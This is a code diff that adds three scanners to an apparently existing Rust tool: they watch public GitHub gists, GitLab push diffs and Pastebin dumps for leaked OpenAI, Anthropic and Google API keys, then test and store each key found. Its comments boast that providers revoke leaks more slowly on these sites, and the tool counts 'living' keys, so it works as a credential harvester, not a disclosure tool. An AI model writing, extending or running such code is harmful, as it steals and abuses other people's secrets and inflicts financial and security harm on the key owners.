@@ -391,6 +391,221 @@ async fn github_events_loop(state: Arc<AppState>) {
     }
 }
 
+// ----------------- GITHUB GISTS SCANNER (providers scan gists LESS aggressively) -----------------
+async fn gists_loop(state: Arc<AppState>) {
+    println!("[+] GitHub Gists Scanner Initialized — scanning public gists in real-time");
+    
+    let client = Client::builder()
+        .user_agent("Mozilla/5.0 (compatible; SecurityResearch/1.0)")
+        .timeout(Duration::from_secs(15))
+        .build().unwrap();
+    
+    let mut seen_gist_ids: HashSet<String> = HashSet::new();
+    let mut scan_count: u64 = 0;
+    
+    loop {
+        scan_count += 1;
+        
+        match client.get("https://api.github.com/gists/public?per_page=100").send().await {
+            Ok(resp) => {
+                if resp.status().is_success() {
+                    if let Ok(gists) = resp.json::<Vec<Value>>().await {
+                        let new_gists: Vec<&Value> = gists.iter()
+                            .filter(|g| {
+                                if let Some(id) = g.get("id").and_then(|i| i.as_str()) {
+                                    !seen_gist_ids.contains(id)
+                                } else { false }
+                            })
+                            .collect();
+                        
+                        if !new_gists.is_empty() {
+                            println!("[*] Gists Scan #{}: {} new public gists found", scan_count, new_gists.len());
+                        }
+                        
+                        for gist in new_gists.iter().take(30) {
+                            if let Some(id) = gist.get("id").and_then(|i| i.as_str()) {
+                                seen_gist_ids.insert(id.to_string());
+                                
+                                // Fetch raw content of each file in the gist
+                                if let Some(files) = gist.get("files").and_then(|f| f.as_object()) {
+                                    for (_filename, file_obj) in files {
+                                        if let Some(raw_url) = file_obj.get("raw_url").and_then(|u| u.as_str()) {
+                                            if let Ok(raw_resp) = client.get(raw_url).send().await {
+                                                if let Ok(content) = raw_resp.text().await {
+                                                    for pat in &state.patterns {
+                                                        for cap in pat.pattern.captures_iter(&content) {
+                                                            if let Some(m) = cap.get(1) {
+                                                                let key = m.as_str().to_string();
+                                                                println!("[!!!] GIST CATCH: {} key in gist {} => {}...", 
+                                                                    pat.provider, id, &key[..key.len().min(25)]);
+                                                                tokio::spawn(test_and_store(key, pat.provider.to_string(), Arc::clone(&state)));
+                                                            }
+                                                        }
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        
+                        if seen_gist_ids.len() > 5000 { seen_gist_ids.clear(); }
+                    }
+                } else if resp.status().as_u16() == 403 {
+                    println!("[-] Gists API rate limited. Sleeping 60s...");
+                    tokio::time::sleep(Duration::from_secs(60)).await;
+                    continue;
+                }
+            },
+            Err(e) => println!("[-] Gists connection error: {}", e),
+        }
+        
+        tokio::time::sleep(Duration::from_secs(15)).await;
+    }
+}
+
+// ----------------- GITLAB PUBLIC EVENTS SCANNER (providers SLOWER here) -----------------
+async fn gitlab_loop(state: Arc<AppState>) {
+    println!("[+] GitLab Public Events Scanner Initialized — providers are slower here!");
+    
+    let client = Client::builder()
+        .user_agent("Mozilla/5.0 (compatible; SecurityResearch/1.0)")
+        .timeout(Duration::from_secs(15))
+        .build().unwrap();
+    
+    let mut scan_count: u64 = 0;
+    let mut seen_ids: HashSet<u64> = HashSet::new();
+    
+    loop {
+        scan_count += 1;
+        
+        // GitLab public events API — get recent push events
+        match client.get("https://gitlab.com/api/v4/events?action=pushed&per_page=50").send().await {
+            Ok(resp) => {
+                if resp.status().is_success() {
+                    if let Ok(events) = resp.json::<Vec<Value>>().await {
+                        let push_events: Vec<&Value> = events.iter()
+                            .filter(|e| {
+                                if let Some(id) = e.get("id").and_then(|i| i.as_u64()) {
+                                    !seen_ids.contains(&id)
+                                } else { false }
+                            })
+                            .collect();
+                        
+                        if !push_events.is_empty() {
+                            println!("[*] GitLab Scan #{}: {} new push events found", scan_count, push_events.len());
+                        }
+                        
+                        for event in push_events.iter().take(15) {
+                            if let Some(id) = event.get("id").and_then(|i| i.as_u64()) {
+                                seen_ids.insert(id);
+                            }
+                            
+                            // Get project ID and commit SHA to fetch the diff
+                            let project_id = event.get("project_id").and_then(|p| p.as_u64()).unwrap_or(0);
+                            
+                            if let Some(push_data) = event.get("push_data") {
+                                if let Some(commit_to) = push_data.get("commit_to").and_then(|c| c.as_str()) {
+                                    let diff_url = format!(
+                                        "https://gitlab.com/api/v4/projects/{}/repository/commits/{}/diff",
+                                        project_id, commit_to
+                                    );
+                                    
+                                    if let Ok(diff_resp) = client.get(&diff_url).send().await {
+                                        if let Ok(diff_text) = diff_resp.text().await {
+                                            for pat in &state.patterns {
+                                                for cap in pat.pattern.captures_iter(&diff_text) {
+                                                    if let Some(m) = cap.get(1) {
+                                                        let key = m.as_str().to_string();
+                                                        println!("[!!!] GITLAB CATCH: {} key in project {} => {}...", 
+                                                            pat.provider, project_id, &key[..key.len().min(25)]);
+                                                        tokio::spawn(test_and_store(key, pat.provider.to_string(), Arc::clone(&state)));
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        
+                        if seen_ids.len() > 5000 { seen_ids.clear(); }
+                    }
+                } else if resp.status().as_u16() == 429 {
+                    println!("[-] GitLab rate limited. Sleeping 30s...");
+                    tokio::time::sleep(Duration::from_secs(30)).await;
+                    continue;
+                }
+            },
+            Err(e) => println!("[-] GitLab connection error: {}", e),
+        }
+        
+        tokio::time::sleep(Duration::from_secs(15)).await;
+    }
+}
+
+// ----------------- PASTEBIN DUMPS SCANNER -----------------
+async fn pastebin_loop(state: Arc<AppState>) {
+    println!("[+] Pastebin Dumps Scanner Initialized — scanning paste sites for leaked keys");
+    
+    let client = Client::builder()
+        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        .timeout(Duration::from_secs(15))
+        .build().unwrap();
+    
+    let queries = vec!["sk-proj-", "sk-ant-api03", "AIzaSy", "OPENAI_API_KEY", "openai_key", "anthropic_key"];
+    let mut query_idx = 0;
+    let mut scan_count: u64 = 0;
+    
+    loop {
+        scan_count += 1;
+        let query = queries[query_idx % queries.len()];
+        query_idx += 1;
+        
+        // Use psbdmp.ws API — indexes pastebin dumps
+        let search_url = format!("https://psbdmp.ws/api/v3/search/{}", query);
+        
+        match client.get(&search_url).send().await {
+            Ok(resp) => {
+                if resp.status().is_success() {
+                    if let Ok(results) = resp.json::<Vec<Value>>().await {
+                        if !results.is_empty() {
+                            println!("[*] Pastebin Scan #{}: {} results for '{}' query", scan_count, results.len(), query);
+                        }
+                        
+                        for paste in results.iter().take(10) {
+                            if let Some(paste_id) = paste.get("id").and_then(|i| i.as_str()) {
+                                let paste_url = format!("https://psbdmp.ws/api/v3/dump/{}", paste_id);
+                                
+                                if let Ok(paste_resp) = client.get(&paste_url).send().await {
+                                    if let Ok(paste_data) = paste_resp.json::<Value>().await {
+                                        if let Some(content) = paste_data.get("content").and_then(|c| c.as_str()) {
+                                            for pat in &state.patterns {
+                                                for cap in pat.pattern.captures_iter(content) {
+                                                    if let Some(m) = cap.get(1) {
+                                                        let key = m.as_str().to_string();
+                                                        println!("[!!!] PASTEBIN CATCH: {} key in paste {} => {}...", 
+                                                            pat.provider, paste_id, &key[..key.len().min(25)]);
+                                                        tokio::spawn(test_and_store(key, pat.provider.to_string(), Arc::clone(&state)));
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            },
+            Err(e) => println!("[-] Pastebin scanner error: {}", e),
+        }
+        
+        tokio::time::sleep(Duration::from_secs(20)).await;
+    }
+}
+
 // ----------------- AXUM WEB SERVER -----------------
 #[derive(Serialize)]
 struct StatsRecord { total: i64, living: i64 }
@@ -507,6 +722,9 @@ async fn main() {
     tokio::spawn(osint_loop(Arc::clone(&state)));
     tokio::spawn(proxy_loop(Arc::clone(&state)));
     tokio::spawn(github_events_loop(Arc::clone(&state)));
+    tokio::spawn(gists_loop(Arc::clone(&state)));
+    tokio::spawn(gitlab_loop(Arc::clone(&state)));
+    tokio::spawn(pastebin_loop(Arc::clone(&state)));
 
     let app = Router::new()
         .fallback_service(ServeDir::new("public"))
